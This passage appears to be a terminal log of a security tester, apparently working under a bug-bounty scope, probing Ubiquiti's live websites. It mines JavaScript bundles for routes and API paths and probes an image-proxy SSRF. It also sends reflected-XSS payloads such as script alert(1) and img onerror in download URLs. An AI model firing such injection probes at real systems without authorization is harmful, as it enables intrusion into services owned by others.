+ntValidation:_}={};function b(){s.useDynamicSearchParams?.("useSearchParams()");let e=(0,u.useContext)(a.SearchParamsContext);return(0,u.useMemo)(()=>e?new a.ReadonlyURLSearch
+e):null,[e])}function m(){return s.useDynamicRouteParams?.("usePathname()"),(0,u.useContext)(a.PathnameContext)}function v(){let e=(0,u.useContext)(i.AppRouterContext);if(
+"_"}),[e,r])}function h(){return s.useDynamicRouteParams?.("useParams()"),(0,u.useContext)(a.PathParamsContext)}function g(e="children"){s.useDynamicRouteParams?.("useSe
+ct.defineProperty(r,"__esModule",{value:!0});var n={ReadonlyURLSearchParams:function(){return u.ReadonlyURLSearchParams},RedirectType:function(){return d},forbidden:function()
+r,"__esModule",{value:!0}),Object.defineProperty(r,"ReadonlyURLSearchParams",{enumerable:!0,get:function(){return o}});class n extends Error{constructor(){super("Method unavai
+/use-search-params#updating-searchparams")}}class o extends URLSearchParams{append(){throw new n}delete(){throw new n}set(){throw new n}sort(){throw new n}}("function"==typeof
+on(){return s},PathnameContext:function(){return c},ReadonlyURLSearchParams:function(){return i.ReadonlyURLSearchParams},SearchParamsContext:function(){return a},createDevTool
+ected;e++){let e=new URL(y.url,c);if(e.origin!==c.origin||e.searchParams.get(o.NEXT_RSC_UNION_QUERY)===c.searchParams.get(o.NEXT_RSC_UNION_QUERY))break;c=new URL(e),await (
+?N(f,t):null,y=await f,g=!0}let v=new URL(y.url,c);return v.searchParams.delete(o.NEXT_RSC_UNION_QUERY),{url:v.href,redirected:g,ok:y.ok,headers:y.headers,body:y.body,statu
+);let c=e.r(276967),s=e.r(887889);function f(e){let t=R(new URLSearchParams(e));return(0,s.getRenderedSearch)(t)}function d(e){let t=e.headers.get(i.NEXT_REWRITTEN_QUERY_HEADE
+===e?"":e.join("/")}function S(e){let t=new URL(e);return t.searchParams.delete(i.NEXT_RSC_UNION_QUERY),t}function m(e,t){return"c"===t||"oc"===t?e.split("/"):e}function R(
+function(){return c},getRenderedSearch:function(){return l},searchParamsToUrlQuery:function(){return u},urlQueryToSearchParams:function(){return o}};for(var a in n)Object.d
+)&&"boolean"!=typeof e?"":String(e)}function o(e){let t=new URLSearchParams;for(let[r,n]of Object.entries(e))if(Array.isArray(n))for(let e of n)t.append(r,i(e));else t.set(r,i
+})),{store:{category:(e,o)=>t({pathname:r.e`/category/${e}`,searchParams:{filter:o?.filter}}),categoryProducts:({category:e,productSlug:o})=>t({pathname:r.e`/category/${e}/
+{pathname:(0,r.y)([e,s,...(0,r.Q)(t)])}),techSpecs:({path:e,searchParams:t})=>a({pathname:(0,r.y)((0,r.Q)(e)),...t&&{searchParams:t}})}},[e,s])}],89893)},604150,e=>{"use st
+=== window.location usage ===
+n;if(!(0,f.isLocalURL)(r)){o&&(t.preventDefault(),location.replace(r));return}if(t.preventDefault(),i){let e=!1;if(i({preventDefault:()=>{e=!0}}),e)return}let{navigat
+)};function l(){let{protocol:e,hostname:t,port:r}=window.location;return`${e}//${t}${r?":"+r:""}`}function u(){let{href:e}=window.location,t=l();return e.substring(t
+rn null}};e.s(["Q",0,s,"V",0,e=>{let t=new URL(e??window.location.pathname,window.origin),i=new URL("/login",a);i.searchParams.set("redirect",t.toString()),window.lo
+et t=new URL(window.origin);t.pathname=e??new URL(window.location.href).pathname;let i=new URL("/logout",a);i.searchParams.set("redirect",t.toString()),window.locati
+r:"Türkçe"},tD=(e,o,r)=>{try{let n,t,a=new URL(r||window.location.href),i=(0,nT.Q)(a.pathname).map(nT.D),l=+!!((n=i[0])&&Object.values(er.B).includes(n))+ +!!((t=i[1
+(()=>{var e,o;if(l.current){l.current=!1;return}e=window.location,o=window.gtag,G.includes(e.host)&&o?.("event","page_view",{page_path:e.pathname+e.search})},[i]),(0
+46),u=e.r(571248);function i(e){return e.origin!==window.location.origin}function o(e){let t;if((0,l.isBot)(window.navigator.userAgent))return null;try{t=new URL((0,
+k=F?(0,f.assignLocation)(F,new URL(e.canonicalUrl,window.location.href)):void 0,H=s.headers.get("content-type"),L=!!(H&&H.startsWith(u.RSC_CONTENT_TYPE_HEADER));if(!
+sitionType)(e);let h=new URL((0,f.addBasePath)(e),location.href);(0,c.setLinkForCurrentNavigation)(n),(0,s.startRouterTransition)(e,t,p().tree,o),(0,i.dispatchAppR
+ExternalUrl:(0,d.isExternalURL)(h),locationSearch:location.search,scrollBehavior:r,navigateType:t})})}function g(e,t){y(e,"push",t?.scroll===!1?u.ScrollBehavior.NoSc
+deredSearch)(e),a=(0,u.createHrefFromUrl)(new URL(location.href)),i=t.t,o={c:a.split("/"),q:n,i:t.i,t:{t:function e(t,r,n){let a,u,i,o=t.s;if("string"==typeof o)a=
+yload:r,initialFlightStreamForCache:null,location:window.location})),i=(0,u.jsx)(D,{children:(0,u.jsx)(d.HeadManagerContext.Provider,{value:{appDir:!0},children:(0,u
+1,O=!1;function L(e){if(e){if(!e.__NA)return void window.location.reload();(0,k.traverse)(window.location.href,e.__PRIVATE_NEXTJS_INTERNALS_TREE)}}function M({appRou
+}};n.pendingPush&&(0,u.createHrefFromUrl)(new URL(window.location.href))!==r?(n.pendingPush=!1,window.history.pushState(a,"",r)):window.history.replaceState(a,"",r),
+()=>{let e=new URL(u,"u"<typeof window?"http://n":window.location.href);return{searchParams:e.searchParams,pathname:(0,v.hasBasePath)(e.pathname)?(0,g.removeBasePath
+E&&(C.pendingMpaPath=void 0,(0,k.restore)(new URL(window.location.href),window.history.state.__PRIVATE_NEXTJS_INTERNALS_TREE))}return window.addEventListener("pagesh
+f(x.mpaNavigation){if(C.pendingMpaPath!==u){let e=window.location;x.pendingPush?e.assign(u):e.replace(u),C.pendingMpaPath=u}throw h.unresolvedThenable}(0,o.useEffect
+ory.replaceState.bind(window.history),n=e=>{let t=window.location.href,n=window.history.state?.__PRIVATE_NEXTJS_INTERNALS_TREE;(0,k.restore)(new URL(e??t,t),n)};wind
+ment;){try{var n="string"==typeof t.contentWindow.location.href}catch(e){n=!1}if(n)e=t.contentWindow;else break;t=nQ(e.document)}return t}function nY(e){var t=e&&e
+)=>{window.history.length>1?window.history.back():window.location.href="/"},children:"Back"})]})]})}),t&&(0,n.jsxs)("p",{style:a.errorStyles.digestFooter,children:["
+ext.__pendingUrl&&(0,a.createHrefFromUrl)(new URL(window.location.href))!==(0,a.createHrefFromUrl)(window.next.__pendingUrl)&&(console.error("Error occurred during n
+ation, falling back to hard navigation",e),window.location.href=window.next.__pendingUrl.toString(),!0)}function u(){}("function"==typeof r.default||"object"==type
+ope&&"function"==typeof self.importScripts,ez=ek&&window.location.href||"http://localhost";e.s(["hasBrowserEnv",0,ek,"hasStandardBrowserEnv",0,eq,"hasStandardBrowser
+[0m
+[0m$ [0mcd /tmp/www27
+echo "=== .get(\"...\") query params ==="
+grep -ohE '\.get\("[^"]+"\)' *.js | sort | uniq -c | sort -rn | head -60
+echo "=== router.push/replace with template ==="
+grep -ohE '.{40}(router\.(push|replace)|redirect)\([^)]{0,120}' *.js | head -40
+echo "=== hardcoded route strings ==="
+grep -ohE 'pathname:`[^`]+`|pathname:"[^"]+"|href:"/[^"]*"' *.js | sort -u | head -60
+=== .get("...") query params ===
+      5 .get("content-type")
+      2 .get("vary")
+      2 .get("other")
+      2 .get("a")
+      1 .get("x-action-revalidated")
+      1 .get("x-action-redirect")
+      1 .get("set-cookie")
+      1 .get("dpl")
+      1 .get("c")
+      1 .get("appview")
+      1 .get("X-Request-URL")
+=== router.push/replace with template ===
+=== hardcoded route strings ===
+[0m
+[0m$ [0mcd /tmp
+for p in robots.txt sitemap.xml sitemap-index.xml; do echo "=== $p ==="; curl -s -A "Mozilla/5.0" "https://www.ui.com/$p" | head -40; done
+echo "=== try known dynamic routes ==="
+for u in "/us/en/download" "/download" "/us/en/download/unifi" "/us/en/whats-new" "/us/en/how-it-works"; do printf "%s -> " "$u"; curl -s -o /dev/null -w "%{http_code} %{redirect_url}\n" -A "Mozilla/5.0" "https://www.ui.com$u"; done
+=== robots.txt ===
+User-Agent: *
+Allow: /
+
+User-Agent: GPTBot
+Allow: /
+
+User-Agent: OAI-SearchBot
+Allow: /
+
+User-Agent: ChatGPT-User
+Allow: /
+
+User-Agent: ClaudeBot
+Allow: /
+
+User-Agent: Claude-Web
+Allow: /
+
+User-Agent: Google-Extended
+Allow: /
+
+User-Agent: PerplexityBot
+Allow: /
+
+User-Agent: CCBot
+Allow: /
+
+User-Agent: Applebot-Extended
+Allow: /
+
+Sitemap: https://ui.com/sitemap.xml
+=== sitemap.xml ===
+<?xml version="1.0" encoding="UTF-8"?>
+<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
+<url>
+<loc>https://ui.com/</loc>
+<lastmod>2026-09-15</lastmod>
+</url>
+<url>
+<loc>https://ui.com/site-support</loc>
+<lastmod>2026-07-13</lastmod>
+</url>
+<url>
+<loc>https://ui.com/professional-integrators</loc>
+<lastmod>2026-07-13</lastmod>
+</url>
+<url>
+<loc>https://ui.com/partner-hub</loc>
+<lastmod>2026-09-15</lastmod>
+</url>
+<url>
+<loc>https://ui.com/whats-new</loc>
+<lastmod>2026-11-03</lastmod>
+</url>
+<url>
+<loc>https://ui.com/ui-care</loc>
+<lastmod>2026-07-13</lastmod>
+</url>
+<url>
+<loc>https://ui.com/endpoint</loc>
+<lastmod>2026-10-16</lastmod>
+</url>
+<url>
+<loc>https://ui.com/cloud-storage</loc>
+<lastmod>2026-11-10</lastmod>
+</url>
+<url>
+<loc>https://ui.com/trust-center</loc>
+<lastmod>2026-11-04</lastmod>
+</url>
+<url>
+<loc>https://ui.com/ultra</loc>
+=== sitemap-index.xml ===
+
+
+
+
+<!doctype html>
+<!--[if lt IE 7]>      <html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]-->
+<!--[if IE 7]>         <html class="no-js lt-ie9 lt-ie8"> <![endif]-->
+<!--[if IE 8]>         <html class="no-js lt-ie9"> <![endif]-->
+<!--[if gt IE 8]><!--> <html class="no-js" lang="en"> <!--<![endif]-->
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, user-scalable=no, maximum-scale=1">
+        <title>Ubiquiti - Error</title>
+        <meta name="keywords" content="ubiquiti, networks, networking, wifi, wi-fi, wireless, AP, access point, enterprise, radio, antenna, camera, video, surveillance, security, ip, voip, voice,  unifi, router, routers, routing, switch, switches, switching, port, ports, poe, power, ethernet, LAN, WLAN, control, radio, multi-radio, rf, radio frequency, frequency, latency, noise, mbps, kbps, gigabit, transmit, isp, wisp, internet service, provider, CPE, backhaul, link, broadband,  antennas, amplifiers, uwn, world network, ubnt, ubiquity, airmax, airfiber, unifi, nanostation, picostation, edgemax, 802.11, bridge, iot, internet-of-things, automation, machine to machine, m2m, wan, gateway, scalable, handoff, packet, packet inspection" />
+        <meta name="dcterms.rightsHolder" content="Ubiquiti Inc.">
+        <meta name="dcterms.dateCopyrighted" content="2026">
+        <meta name="description" content="Technology platforms for Internet Access, Enterprise, and SmartHome applications." />
+        <meta name="format-detection" content="telephone=no">
+
+        <!-- Facebook Insights -->
+        <meta property="fb:app_id" content="140563119297621" />
+        <meta property="og:url"                content="https://www.ui.com/sitemap-index.xml" />
+        <meta property="og:type"               content="website" />
+        <meta property="og:title"              content="Ubiquiti - Rethinking IT" />
+        <meta property="og:description"        content="Technology platforms for Internet Access, Enterprise, and SmartHome applications." />
+        <meta property="og:image"              content="https://www.ui.com/microsite/og-image.png" />
+      		
+      	<!-- twitter -->
+        <meta name="twitter:card" content="summary_large_image">
+        <meta name="twitter:site" content="@ui">
+        <meta name="twitter:title" content="Ubiquiti - Rethinking IT">
+        <meta name="twitter:description" content="Technology platforms for Internet Access, Enterprise, and SmartHome applications.">
+        <meta name="twitter:image" content="https://www.ui.com/microsite/og-image.png">
+
+
+        <!-- IE10 Metro title icon -->
+        <meta name="application-name" content="Ubiquiti"/>
+        <meta name="msapplication-TileColor" content="#0193d7"/>
+        <meta name="msapplication-square70x70logo" content="/microsite/favicon-32x32.png"/>
+=== try known dynamic routes ===
+/us/en/download -> 200 
+/download -> 200 
+/us/en/download/unifi -> 200 
+/us/en/whats-new -> 200 
+/us/en/how-it-works -> 200
+[0m
+[0m$ [0mcd /tmp
+echo "=== www headers ==="; curl -s -D - -o /dev/null -A "Mozilla/5.0" https://www.ui.com/ | grep -iE 'server|x-vercel|x-nextjs|x-powered|via|cache|age|content-security|strict-transport|set-cookie' | head -40
+echo "=== next version strings ==="
+grep -ohE '"1[0-9]\.[0-9]+\.[0-9]+[^"]*"|next@[0-9][^" ]*|version:"[0-9][^"]*"' /tmp/www27/*.js 2>/dev/null | sort -u | head
+echo "=== try _next/image SSRF-ish (in scope www) ==="
+curl -s -o /dev/null -w "image proxy: %{http_code}\n" -A "Mozilla/5.0" "https://www.ui.com/_next/image?url=https%3A%2F%2Fexample.com%2Fx.png&w=64&q=75"
+echo "=== middleware/rewrite behavior ==="
+curl -s -D - -o /dev/null -A "Mozilla/5.0" "https://www.ui.com/us/en" | grep -iE 'x-middleware|location|x-vercel' | head
+=== www headers ===
+cache-control: private, no-store
+set-cookie: store-referer=us; Path=/; Expires=Wed, 24 Nov 2027 09:39:16 GMT; Max-Age=31536000; Domain=.ui.com; Secure; SameSite=lax
+set-cookie: microsite-language=EN; Path=/; Expires=Wed, 24 Nov 2027 09:39:16 GMT; Max-Age=31536000; Domain=.ui.com; Secure; SameSite=lax
+set-cookie: country-code-session=US; Path=/; Domain=.ui.com; Secure; SameSite=lax
+x-nextjs-cache: HIT
+x-nextjs-prerender: 1
+x-nextjs-prerender: 1
+x-nextjs-stale-time: 300
+x-cache: Miss from cloudfront
+via: 1.1 0dbcd41de6748d28ecd1d0aa52084468.cloudfront.net (CloudFront)
+strict-transport-security: max-age=31536000; includeSubDomains; preload
+=== next version strings ===
+"19.3.0-canary-278794d7-20261002"
+next@16.4.6_@babel+core@7.29.13_supports-color@7.2.0__@types+node@24.19.2_react-dom@19.3.1_react@19.3.1__react@19.3.1/node_modules/next/dist/compiled/process/
+version:"16.4.6"
+version:"19.3.0-canary-278794d7-20261002"
+version:"3.38.1"
+=== try _next/image SSRF-ish (in scope www) ===
+image proxy: 404
+=== middleware/rewrite behavior ===
+[0m
+[0m$ [0mcd /tmp
+curl -s -A "Mozilla/5.0" https://ui.com/sitemap.xml | grep -oE '<loc>[^<]+</loc>' | sed 's#</\?loc>##g' | sort -u > sitemap_urls.txt
+wc -l sitemap_urls.txt; head -40 sitemap_urls.txt
+echo "=== dynamic download route tests (new build) ==="
+for slug in "unifi" "unifi%22%3E%3Cscript%3Ealert(1)%3C/script%3E" "unifi%27%3E%3Cimg%20src=x%20onerror=alert(1)%3E"; do
+  echo "--- slug=$slug"; curl -s -A "Mozilla/5.0" "https://www.ui.com/download/software/$slug" -o /tmp/dl.html -w "%{http_code} %{size_download}\n"; grep -oE 'alert\(1\)|&lt;script|onerror' /tmp/dl.html | head -3; done
+echo "=== download/unifi family injection ==="
+for fam in "unifi" "unifi%3Cscript%3Ealert(1)%3C%2Fscript%3E" "unifi%22%20onmouseover%3Dalert(1)"; do
+  echo "--- fam=$fam"; curl -s -A "Mozilla/5.0" "https://www.ui.com/download/$fam" -o /tmp/dl2.html -w "%{http_code} %{size_download}\n"; grep -oE 'alert\(1\)|<script>alert' /tmp/dl2.html | head -3; done
+82 sitemap_urls.txt
+https://ui.com/
+https://ui.com/cloud-gateways
+https://ui.com/cloud-gateways/compact
+https://ui.com/cloud-gateways/enterprise-scale
+https://ui.com/cloud-gateways/large-scale
+https://ui.com/cloud-gateways/resource-calculator
+https://ui.com/cloud-gateways/wifi-integrated
+https://ui.com/cloud-storage
+https://ui.com/door-access
+https://ui.com/door-access/control-hubs
+https://ui.com/door-access/intercoms
+https://ui.com/door-access/readers
+https://ui.com/door-access/starter-kits
+https://ui.com/door-access/touch-pass
+https://ui.com/download
+https://ui.com/download/app/endpoint-desktop
+https://ui.com/download/app/identity-desktop
+https://ui.com/download/app/wifiman-desktop
+https://ui.com/download/releases/firmware
+https://ui.com/download/releases/unifi-os-server
+https://ui.com/download/unifi/download-started
+https://ui.com/endpoint
+https://ui.com/how-it-works
+https://ui.com/how-it-works/large
+https://ui.com/how-it-works/massive-scale
+https://ui.com/how-it-works/multi-site
+https://ui.com/integrations/accessory-tech
+https://ui.com/integrations/accessory-tech/air-wire
+https://ui.com/integrations/accessory-tech/internet-solutions
+https://ui.com/integrations/accessory-tech/sfp-wizard
+https://ui.com/integrations/accessory-tech/travel-router
+https://ui.com/integrations/cloud-keys-gateways/control-plane-options
+https://ui.com/integrations/cloud-keys-gateways/independent-gateways
+https://ui.com/integrations/managed-voip
+https://ui.com/integrations/managed-voip/international-rates
+https://ui.com/integrations/mobile-routing
+https://ui.com/integrations/network-storage
+https://ui.com/integrations/power-tech/power-solutions
+https://ui.com/integrations/power-tech/ups-solutions
+https://ui.com/integrations/premium-iot/digital-signage
+=== dynamic download route tests (new build) ===
+--- slug=unifi
+404 357034
+onerror
+onerror
+onerror
+--- slug=unifi%22%3E%3Cscript%3Ealert(1)%3C/script%3E
+404 338611
+alert(1)
+onerror
+onerror
+--- slug=unifi%27%3E%3Cimg%20src=x%20onerror=alert(1)%3E
+404 357208
+onerror
+alert(1)
+onerror
+=== download/unifi family injection ===
+--- fam=unifi
+200 1334061
+--- fam=unifi%3Cscript%3Ealert(1)%3C%2Fscript%3E
+404 367982
+alert(1)
+alert(1)
+alert(1)
+--- fam=unifi%22%20onmouseover%3Dalert(1)
+404 356663
+alert(1)
+alert(1)
+alert(1)
+[0m
+[0m$ [0mcd /tmp
+curl -s -A "Mozilla/5.0" "https://www.ui.com/download/software/unifi%22%3E%3Cscript%3Ealert(1)%3C/script%3E" -o inj.html
+echo "=== raw occurrences ==="; grep -oE '.{60}alert\(1\).{80}' inj.html | head -10
+echo "=== check escaping ==="; grep -oE '&lt;script&gt;|%3Cscript%3E|<script>alert' inj.html | sort | uniq -c
+echo "=== check canonical/og ==="; grep -oE '<link rel="canonical"[^>]*>|<meta property="og:url"[^>]*>' inj.html | head
+echo "=== title ==="; grep -oE '<title>[^<]*</title>' inj.html | head -1
+=== raw occurrences ===
+\":[\"\",\"download\",\"software\",\"unifi%22%3E%3Cscript%3Ealert(1)%3C\",\"script%3E\"],\"q\":\"\",\"i\":false,\"t\":{\"t\":{\"s\":\"\",\"h\":16,\"
+=== check escaping ===
+      1 %3Cscript%3E
+=== check canonical/og ===
+=== title ===
+[0m
+[0m$ [0mcd /tmp/www27
+echo "=== server actions markers ==="
+grep -ohE 'createServerReference|\$ACTION_ID_|use server|__next_action|next-action' *.js | sort | uniq -c
+echo "=== forms / actions in html ==="
+grep -oE '<form[^>]*>' /tmp/www.html | head -10
+grep -oE 'action="[^"]*"' /tmp/www.html | head -10
+echo "=== API-like fetches in chunks ==="
+grep -ohE 'fetch\(`[^`]*`|fetch\("[^"]*"|axios\.(get|post)\([^)]{0,80}' *.js | sort -u | head -40
+echo "=== svc endpoints referenced ==="
+grep -ohE 'https://[a-z0-9.-]*\.svc\.ui\.com[^"'"'"'` )]*' *.js | sort -u | head -40
+=== server actions markers ===
+      1 createServerReference
+      1 next-action
+=== forms / actions in html ===
+<form class="sc-1os9vrs-6 juruXo" action="https://ui.us8.list-manage.com/subscribe" method="get" target="_blank">
+action="https://ui.us8.list-manage.com/subscribe"
+=== API-like fetches in chunks ===
+fetch(`${this.announcementsUrl}/${e}/read`
+=== svc endpoints referenced ===
+https://download.dev.svc.ui.com
+https://download.stg.svc.ui.com
+https://download.svc.ui.com
+https://feedback.dev.svc.ui.com
+https://feedback.stg.svc.ui.com
+https://feedback.svc.ui.com
+https://images.dev.svc.ui.com/
+https://images.stg.svc.ui.com/
+https://images.svc.ui.com/
+https://megaphone.dev.svc.ui.com
+https://megaphone.stg.svc.ui.com
+https://megaphone.svc.ui.com
+[0m
+New build has a **Server Action** (prior build had none). Let me investigate it.
+[0m$ [0mcd /tmp/www27
+echo "=== createServerReference context ==="
+grep -lE 'createServerReference' *.js
+for f in $(grep -lE 'createServerReference' *.js); do echo "### $f"; grep -oE '.{300}createServerReference.{300}' "$f" | head -2; done
+echo "=== next-action / action id ==="
+grep -ohE '.{80}(next-action|createServerReference|serverReference|ACTION_ID).{160}' *.js | head -10
+echo "=== 40-hex ids near action ==="
+grep -ohE '[0-9a-f]{40}' *.js | sort -u | head -20
+=== createServerReference context ===
+0yq4grgdgv_kn.js
+### 0yq4grgdgv_kn.js
+State=d,u._rowID=o,u._rowTag=p,u._rowLength=y,i.read().then(t).catch(n)}).catch(n)}r.createFromFetch=function(e,t){var r=eg(t);return e.then(function(e){ev(r,e.body,ey.bind(null,r))},function(e){B(r,e)}),$(r,0)},r.createFromReadableStream=function(e,t){return ev(t=eg(t),e,ey.bind(null,t)),$(t,0)},r.createServerReference=function(e,t){function r(){var r=Array.prototype.slice.call(arguments);return t(e,r)}return P(r,e,null),r},r.createTemporaryReferenceSet=function(){return new Map},r.encodeReply=function(e,t){return new Promise(function(r,n){!function(e,t,r,n,l){function u(){null!==O&&O.abort("The reply ended.")}fu
+=== next-action / action id ===
+r(var a in n)Object.defineProperty(r,a,{enumerable:!0,get:n[a]});let l="rsc",u="next-action",i="next-router-state-tree",o="next-router-prefetch",c="next-router-segment-prefetch",s="next-hmr-refresh",f="next-url",d="text/x-component",h="next-instant-na
+){if("then"===n)return null;var l=t.id;if("string"!=typeof l)return null;if(!e._serverReferenceConfig)return function(e,t){function r(){var e=Array.prototype.slice.call(arguments);return a?"fulfilled"===a.status?t(n,a.value.concat(e)):Promise.resolve(a).t
+)throw Error(a(589,t))}return n.async?[n.id,n.chunks,r,1]:[n.id,n.chunks,r]}(e._serverReferenceConfig,l),i=t.bound;if(t=f(u))i instanceof A&&(t=Promise.all([t,i]));else{if(!(i instanceof A))return P(t=d(u),l,i),t;t=Promise.resolve(i)}if(H){var o=H;o.deps+
+(a(466))}function el(e,t,r,n,a,l,u,i){var o=new Map;this._bundlerConfig=e,this._serverReferenceConfig=t,this._moduleLoading=r,this._callServer=void 0!==n?n:ea,this._encodeFormAction=a,this._nonce=l,this._chunks=o,this._stringDecoder=function(){return new 
+FromReadableStream=function(e,t){return ev(t=eg(t),e,ey.bind(null,t)),$(t,0)},r.createServerReference=function(e,t){function r(){var r=Array.prototype.slice.call(arguments);return t(e,r)}return P(r,e,null),r},r.createTemporaryReferenceSet=function(){return new 
+=== 40-hex ids near action ===
+[0m
+[0m$ [0mcd /tmp/www27
+echo "=== files containing route names ==="
+grep -lE 'whats-new|trust-center|how-it-works|productFamily|download' *.js | head
+echo "=== route arrays ==="
+grep -ohE '.{40}"(download|software|releases|whats-new|trust-center|productFamily)".{80}' *.js | head -30
+echo "=== segments / app router tree ==="
+grep -ohE 'children:\[[^]]{0,200}\]' *.js | grep -oE '"[a-z][a-z0-9-]+"' | sort -u | head -80
+=== files containing route names ===
+02aqcd17vx73t.js
+02artkfhcdhr9.js
+08ap5_0xtv1jr.js
+0eub7_yarwgaf.js
+0urgclzdrg6-o.js
+1b4ucgmbwd8nt.js
+1ptv65wlzwg3f.js
+2q5xuinhsijkc.js
+2r55-pzowgk9w.js
+3jzk1w2zhrxgq.js
+=== route arrays ===
+nt.which)||t.currentTarget.hasAttribute("download"))return;if(!(0,f.isLocalURL)(r)){o&&(t.preventDefault(),location.replace(r));re
+thUnifi",t.Support="support",t.WhatsNew="whats-new",t);let em={careers:ee.f.CAREERS,contact:ee.f.CONTACT,investors:ee.f.INVESTORS,c
+msAndConditions]),urls:a,miscLinks:[{id:"whats-new",label:t("footer.whats-new"),src:n([m.y.Ui,"/whats-new"]),items:[]},{id:"support
+oveAttribute(n);break;case"capture":case"download":!0===r?e.setAttribute(n,""):!1!==r&&null!=r&&"function"!=typeof r&&"symbol"!=ty
+w Set(["href","hrefLang","target","rel","download","ping","referrerPolicy"]),o=new Set(["dir","lang","hidden","inert","translate"]
+rigin!==location.origin||o.hasAttribute("download")||e.metaKey||e.ctrlKey||e.altKey||e.shiftKey)||!n||(e.preventDefault(),t.open(e
+if(e)for(let r of["href","target","rel","download","ping","referrerPolicy"])r in e&&void 0!==e[r]&&(n[r]="href"===r?t:e[r]);return
+d 0,event:r,lengthComputable:null!=s,[t?"download":"upload"]:!0})},r)},e8=(e,t)=>{let r=null!=e;return[n=>t[0]({lengthComputable:r
+=== segments / app router tree ===
+"aria-hidden"
+"cart-quantity"
+"data-test-id"
+"dropdown"
+"get"
+"icon"
+"large"
+"meta"
+"noindex"
+"noscript"
+"robots"
+"span"
+"text"
+"true"
+[0m
+Let me pivot to a fresh angle on the account bundle: client-side path traversal (CSPT) in API calls, which the summaries haven't explicitly covered.
+[0m$ [0mcd /tmp && mkdir -p acct27 && curl -s -A "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15" "https://account.ui.com/assets/index-DUlTrD1u.js" -o acct27/app.js && ls -l acct27/app.js && sha256sum acct27/app.js
+echo "=== fetch/axios template-literal paths ==="
+grep -ohE '(fetch|axios\.(get|post|put|patch|delete)|\.get|\.post|\.put|\.patch|\.delete)\(\s*`[^`]{0,120}`' acct27/app.js | sort -u | head -60
+-rw-r--r-- 1 runner runner 6941256 Nov 24 09:40 acct27/app.js
+a26e5447814525949b83fe3e5b39dde4d2145fddfad86f6fd96596782b680f5c  acct27/app.js
+=== fetch/axios template-literal paths ===
+.delete(`Host`
+.delete(`authorization`
+.delete(`content-type`
+.delete(`index`
+.delete(`org`
+.get(`${ihe.base}${ihe.paths.nca}?t=${Date.now()}`
+.get(`${q$.paths.checkEmail}/${e}`
+.get(`${q$.paths.checkUsername}/${e}`
+.get(`=${p}`
+.get(`Retry-After`
+.get(`X-Amz-Content-Sha256`
+.get(`X-Amz-Target`
+.get(`X-Sentry-Rate-Limits`
+.get(`baggage`
+.get(`code`
+.get(`content-length`
+.get(`content-type`
+.get(`decision`
+.get(`description`
+.get(`error`
+.get(`host_id`
+.get(`innerRedirect`
+.get(`key`
+.get(`login_hint`
+.get(`open`
+.get(`org_id`
+.get(`org`
+.get(`other`
+.get(`product`
+.get(`redirect`
+.get(`sentry-trace`
+.get(`sentry.dsc`
+.get(`sentry.sample_rand`
+.get(`sentry.sample_rate`
+.get(`set-cookie`
+.get(`site_id`
+.get(`state`
+.get(`token`
+.get(`traceparent`
+.post(`${q$.paths.validateAddress}`
+.post(`${rhe.paths.auth}`
+.put(`${q$.paths.verifyRegistration}/${e}`
+[0m
+[0m$ [0mcd /tmp/acct27
+echo "=== paths object definition (api constants) ==="
+grep -ohE 'paths:\{[^}]{0,1500}\}' app.js | head -1 | tr ',' '\n' | head -120
+echo "=== template paths with interpolated ids ==="
+grep -ohE '`[^`]*\$\{[^`]{0,60}`' app.js | grep -E '^`/|/api/|/user/|/zendesk|/ticket|/invoice|/address|/session|/device|/mfa' | sort -u | head -60
+=== paths object definition (api constants) ===
+paths:{zendeskUser:`zendesk/user`
+zendeskCreateTicket:`zendesk/ticket`
+zendeskOpenTickets:`zendesk/tickets`
+zendeskClosedTickets:`zendesk/tickets/closed`
+zendeskCcdTickets:`zendesk/tickets/ccd`
+zendeskSearchTickets:`zendesk/search_tickets`
+zendeskSearchCcdTickets:`zendesk/search_ccd`
+zendeskComments:`zendesk/comments`
+zendeskCreateComment:`zendesk/comment`
+zendeskMarkTicketAsClosed:`zendesk/ticket/{ticketId}
+=== template paths with interpolated ids ===
+`/${e.hash.slice(1)}`
+`/login${n}`
+`/login?${n}`
+`/login?innerRedirect=${n}`
+`/node_modules/country-flag-icons/3x2/${e.toUpperCase()}.svg`
+`/organizations/${encodeURIComponent(t)}/`
+`/subscriptions/cloud-storage/subscribe?org=${encodeURIComponent(e.org_id)}`
+`/subscriptions/site-support/subscribe${n?`
+[0m
+[0m$ [0mcd /tmp/acct27
+echo "=== hash.slice context ==="
+grep -oE '.{400}hash\.slice\(1\).{400}' app.js | head -4
+echo; echo "=== innerRedirect context ==="
+grep -oE '.{300}innerRedirect.{300}' app.js | head -6
+=== hash.slice context ===
+
+=== innerRedirect context ===
+ch(e){return db(e)&&e.status===403?_Q(n,`password`,{onSubmit:`VALIDATION_INVALID_PASSWORD`}):_Q(n,`password`,{onSubmit:`ERROR_GENERIC_TRY_AGAIN`})}await e?.()}});return n},xQ=()=>{let e=uC(),t=kp();return(0,F.useCallback)(n=>{let r=t.getQueryData([H.SSO_LOGIN_STATE]),i=n?.redirect??r?.redirect,a=n?.innerRedirect??r?.innerRedirect;i?window.location.replace(i):e(a||`/`,{replace:!0})},[t,e])},SQ=function(e){return e.ACTIVE=`active`,e.PENDING=`pending`,e.BLOCKED=`blocked`,e.BACKUP=`backup`,e.DEACTIVATED=`deactivated`,e}({}),CQ=function(e){return e.email=`email`,e.totp=`totp`,e.sms=`sms`,e.webAuthn=`webauthn`,e
+othPic Passkey Provider`,e.WINDOWS_HELLO=`Windows Hello`,e.YUBIKEY=`YubiKey`,e.YUBICO=`Yubico`,e.ANDROID_AUTHENTICATOR=`Android Authenticator`,e.ANDROID_AUTHENTICATOR_SAFETYNET=`Android Authenticator with SafetyNet Attestation`,e}({}),T9e=[`push`,`totp`,`webauthn`],TQ=e=>{if(!e)return{redirect:null,innerRedirect:null};try{let t=new URL(e),n=new URLSearchParams(t.search),r=n.get(`redirect`),i=n.get(`innerRedirect`);return{redirect:NS(r)?r:null,innerRedirect:IS(i)?i:null}}catch{return{redirect:null,innerRedirect:null}}},E9e=(e,t)=>{if(!t)return!1;let{hostname:n}=new URL(t);return e.includes(n)},D9e=e=>e.type
